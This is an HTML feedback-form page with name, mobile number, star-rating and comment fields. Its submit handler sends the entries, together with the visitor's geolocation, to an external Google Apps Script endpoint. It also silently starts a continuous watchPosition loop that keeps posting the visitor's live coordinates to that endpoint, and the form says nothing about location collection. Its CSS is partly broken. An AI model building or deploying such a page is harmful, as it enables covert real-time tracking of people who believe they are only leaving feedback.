<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Feedback Form</title>

<style>
body{
    {
    margin:0;
    padding:0;
    font-family:Arial, sans-serif;
    font-family: Arial;
    padding:20px;
    background:url('https://wallpapercave.com/wp/wp1945909.jpg')
    no-repeat center center fixed;

    background-size:cover;

    display:flex;
    justify-content:center;
    align-items:center;

    min-height:100vh;
}
.container{

    background:rgba(255,255,255,0.9);

    padding:30px;

    border-radius:15px;

    box-shadow:0 0 20px rgba(0,0,0,0.3);

    width:350px;

    text-align:center;
}
input,select,textarea{
    width:95%;
    padding:10px;
    margin:8px 0;

    border:1px solid #ccc;
    border-radius:5px;
}
button{

    background:#007bff;
    color:white;
    border:none;
    padding:12px 20px;
    border-radius:5px;
    cursor:pointer;
}
    button:hover{

    background:#0056b3;
.star{

    font-size:30px;
    cursor:pointer;
    color:gray;
}

.active{
    color:gold;
}

button{
    padding:10px 20px;
}
</style>
</head>

<body>

<h2>Feedback Form</h2>

<input type="text" id="name" placeholder="Enter Name" required><br>

<select id="countryCode">
  <option value="+91">🇮🇳 India (+91)</option>
  <option value="+1">🇺🇸 USA (+1)</option>
  <option value="+44">🇬🇧 UK (+44)</option>
  <option value="+971">🇦🇪 UAE (+971)</option>
</select><br>

<input
type="tel"
id="mobile"
placeholder="Enter 10 Digit Mobile Number"
maxlength="10"
oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,10)"
><br>

<h3>Rating</h3>

<div>
<span class="star" onclick="rate(1)">★</span>
<span class="star" onclick="rate(2)">★</span>
<span class="star" onclick="rate(3)">★</span>
<span class="star" onclick="rate(4)">★</span>
<span class="star" onclick="rate(5)">★</span>
</div>

<br>

<textarea id="comments" placeholder="Comments"></textarea>

<br><br>

<button onclick="sendData()">Submit</button>

<script>

let rating = 0;

function rate(value){

rating = value;

let stars = document.querySelectorAll('.star');

stars.forEach((star,index)=>{

if(index < value){
star.classList.add('active');
}
else{
star.classList.remove('active');
}

});

}

function sendData(){

let mobile = document.getElementById("mobile").value;

if(mobile.length !== 10){
alert("Enter valid 10 digit mobile number");
return;
}

navigator.geolocation.getCurrentPosition(function(position){

const data = {

name: document.getElementById("name").value,
countryCode: document.getElementById("countryCode").value,
mobile: document.getElementById("mobile").value,
rating: rating,
comments: document.getElementById("comments").value,
latitude: position.coords.latitude,
longitude: position.coords.longitude

};
navigator.geolocation.watchPosition(function(position) {

  const data = {
    latitude: position.coords.latitude,
    longitude: position.coords.longitude
  };

  fetch("https://script.google.com/macros/s/AKfycbwLnchs0Vbb5WunOde6aMifLjelLIz1eylC9oH7VPJazm7XLuJLzMdYVrIHtYf7QfPS/exec", {
    method: "POST",
    body: JSON.stringify(data)
  });

});
fetch("https://script.google.com/macros/s/AKfycbwLnchs0Vbb5WunOde6aMifLjelLIz1eylC9oH7VPJazm7XLuJLzMdYVrIHtYf7QfPS/exec",{

method:"POST",
body:JSON.stringify(data)

})

.then(response => response.text())
.then(result => {

alert("Submitted Successfully");

})

.catch(error => {

alert("Error : " + error);

});

});

}

</script>

</body>
</html>
